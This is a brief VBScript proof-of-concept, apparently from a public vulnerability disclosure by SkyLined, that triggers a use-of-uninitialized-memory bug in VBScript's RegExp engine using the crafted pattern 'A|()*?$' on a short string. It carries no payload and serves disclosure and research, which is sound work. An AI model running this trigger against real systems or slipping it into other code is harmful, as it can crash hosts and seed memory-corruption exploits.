' This PoC attempts to exploit a use-of-uninitialized-memory bug in VBScript
' See http://blog.skylined.nl/20161107001.html for details.
Set oRegExp = New RegExp
oRegExp.Pattern = "A|()*?$"
oRegExp.Global = True
oRegExp.Execute(String(&H11, "A") & "x")
' This work by SkyLined is licensed under a Creative Commons
' Attribution-Non-Commercial 4.0 International License. 
